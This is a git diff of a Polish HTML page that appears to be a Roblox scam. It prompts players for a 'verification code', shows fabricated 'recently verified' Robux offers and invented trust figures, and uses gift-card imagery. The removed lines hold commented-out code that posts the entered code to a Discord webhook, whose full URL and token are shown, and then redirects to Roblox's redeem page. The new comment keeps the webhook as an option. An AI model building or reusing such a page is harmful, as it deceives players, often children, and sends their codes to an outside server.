@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Weryfikacja kodu</title>
+  <link rel="icon" type="image/png" href="favicon.png">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
     :root{--accent:#4CAF50}
@@ -142,35 +143,30 @@
       to   { opacity: 0; transform: translateY(12px); }
     }
 
-    /* responsywność: zmniejsz box na małych ekranach */
     @media (max-width:520px){
       .offer-box { right: 10px; left: 10px; width: auto; top: 12px; }
       .img-top-left { width: 90px; top: 10px; left: 8px; }
       .img-bottom-right { width: 120px; right: 8px; bottom: 8px; }
-      .side-box{ display:none; } /* ukryj boczny box na małych ekranach */
+      .side-box{ display:none; }
     }
   </style>
 </head>
 <body>
   <canvas id="bg"></canvas>
 
-  <!-- logo i giftcard (nazwij pliki w repo: logo.png i giftcard.png) -->
-  <img src="logo.png" class="img-top-left" alt="Logo (logo.png)">
-  <img src="giftcard.png" class="img-bottom-right" alt="Giftcard (giftcard.png)">
+  <img src="logo.png" class="img-top-left" alt="Logo">
+  <img src="giftcard.png" class="img-bottom-right" alt="Giftcard">
 
-  <!-- PANEL OFERT (prawy górny) -->
   <div class="offer-box" id="offerBox">
     <div style="font-size:13px; color:rgba(255,255,255,0.8); margin-bottom:6px;">Ostatnio Zweryfikowane!</div>
     <div class="offer-list" id="offerList"></div>
   </div>
 
-  <!-- Panel po lewej -->
   <div class="side-box">
     <h3>Zaufało nam</h3>
     <p>19,5k Graczy!</p>
   </div>
 
-  <!-- Główne okno na środku -->
   <div class="content">
     <h1>Wpisz kod Weryfikacji!</h1>
     <input type="password" id="code" placeholder="Podaj kod ">
@@ -180,7 +176,7 @@
   </div>
 
   <script>
-    // ---------- tło - animacja kwadratów ----------
+    // ---------- tło ----------
     const canvas = document.getElementById('bg');
     const ctx = canvas.getContext('2d');
     function resizeCanvas(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
@@ -212,7 +208,7 @@
     }
     animateBg();
 
-    // ---------- sprawdzanie kodu (placeholder webhook) ----------
+    // ---------- sprawdzanie kodu ----------
     function checkCode() {
       const code = document.getElementById("code").value;
       const message = document.getElementById("message");
@@ -222,12 +218,10 @@
         return;
       }
       message.textContent = "Weryfikacja udana!";
-      // const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
-      // fetch(webhookURL,{ method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ content: `Kod użytkownika: ${code}` }) }).catch(e=>console.error(e));
-      // setTimeout(()=> window.location.href = "https://www.roblox.com/redeem", 1000);
+      // webhook lub przekierowanie opcjonalnie
     }
 
-    // ---------- ROTATOR OFERT (3 widoczne, rotacja co losowy czas między 150s a 320s) ----------
+    // ---------- ROTATOR LOSOWYCH OFERT ----------
     const offers = [
       "100 Robux","175 Robux","200 Robux","400 Robux","570 Robux","800 Robux","860 Robux",
       "1000 Robux","1200 Robux","1500 Robux","1700 Robux","2200 Robux","2500 Robux",
@@ -235,20 +229,6 @@
     ];
 
     const offerListEl = document.getElementById('offerList');
-
-    // pokazujemy początkowe 3 oferty (weź pierwsze 3)
-    let currentIndex = 0;
-    function seedInitial(){
-      offerListEl.innerHTML = '';
-      // pokaż trzy początkowe oferty (ostatnie 3 z listy, żeby wyglądało jak "ostatnie")
-      for(let i = 0; i < 3; i++){
-        const idx = (currentIndex + i) % offers.length;
-        const el = createOfferEl(offers[idx]);
-        offerListEl.appendChild(el);
-      }
-      // ustaw index na następny po tych 3
-      currentIndex = (currentIndex + 3) % offers.length;
-    }
 
     function createOfferEl(text){
       const wrapper = document.createElement('div');
@@ -264,70 +244,52 @@
       return wrapper;
     }
 
-    // wykonaj rotację: usuń dolny element z animacją, przesuwamy, dodajemy nowy na górę z anim-in
+    function seedInitial(){
+      offerListEl.innerHTML = '';
+      for(let i=0;i<3;i++){
+        const randIdx = Math.floor(Math.random() * offers.length);
+        const el = createOfferEl(offers[randIdx]);
+        offerListEl.appendChild(el);
+      }
+    }
+
     function rotateOnce(){
       const items = offerListEl.querySelectorAll('.offer-item');
-      if(items.length === 0){
-        // jeśli puste, seeduj
-        seedInitial();
-        scheduleNext();
-        return;
-      }
+      if(items.length===0){ seedInitial(); scheduleNext(); return; }
 
-      const bottom = items[items.length - 1];
-      // oznacz bottom jako anim-out
+      const bottom = items[items.length-1];
       bottom.classList.add('anim-out');
 
-      // po czasie animacji usuwamy bottom i wstawiamy nowy na górze
-      setTimeout(()=> {
-        // usuń element dolny z DOM
-        if (bottom.parentNode) bottom.parentNode.removeChild(bottom);
-
-        // stwórz nowy element z następną ofertą
-        const newOfferText = offers[currentIndex % offers.length];
-        currentIndex = (currentIndex + 1) % offers.length;
-        const newEl = createOfferEl(newOfferText);
-        // dodaj klasę anim-in żeby ładnie się pojawił
+      setTimeout(()=>{
+        if(bottom.parentNode) bottom.parentNode.removeChild(bottom);
+        const randIdx = Math.floor(Math.random() * offers.length);
+        const newEl = createOfferEl(offers[randIdx]);
         newEl.classList.add('anim-in');
-
-        // wstaw na początek listy
-        if (offerListEl.firstChild) {
+        if(offerListEl.firstChild){
           offerListEl.insertBefore(newEl, offerListEl.firstChild);
         } else {
           offerListEl.appendChild(newEl);
         }
-
-        // po chwili usuń klasę anim-in (żeby następne pojawienie było świeże)
-        setTimeout(()=> newEl.classList.remove('anim-in'), 700);
-
-        // schedule next rotation
+        setTimeout(()=>newEl.classList.remove('anim-in'),700);
         scheduleNext();
-      }, 620); // trochę więcej niż CSS animation (600ms)
+      },620);
     }
 
-    // losowy interwał między 150s a 320s (w ms)
     function randomIntervalMs(){
-      const min = 150000; // 150s
-      const max = 320000; // 320s
-      return Math.floor(Math.random() * (max - min + 1)) + min;
+      const min=150000,max=320000;
+      return Math.floor(Math.random()*(max-min+1))+min;
     }
 
-    let rotationTimer = null;
+    let rotationTimer=null;
     function scheduleNext(){
-      const t = randomIntervalMs();
-      // dla debugowania odkomentuj poniższą linię (wyświetla w konsoli czas do następnej rotacji)
-      // console.log('Next rotation in (s):', Math.round(t/1000));
-      rotationTimer = setTimeout(rotateOnce, t);
+      const t=randomIntervalMs();
+      rotationTimer=setTimeout(rotateOnce,t);
     }
 
-    // start
     seedInitial();
     scheduleNext();
+    window.addEventListener('beforeunload',()=>{ if(rotationTimer) clearTimeout(rotationTimer); });
 
-    // ---------- opcjonalnie: wyczyść timer przy unload ----------
-    window.addEventListener('beforeunload', ()=> {
-      if (rotationTimer) clearTimeout(rotationTimer);
-    });
   </script>
 </body>
 </html>
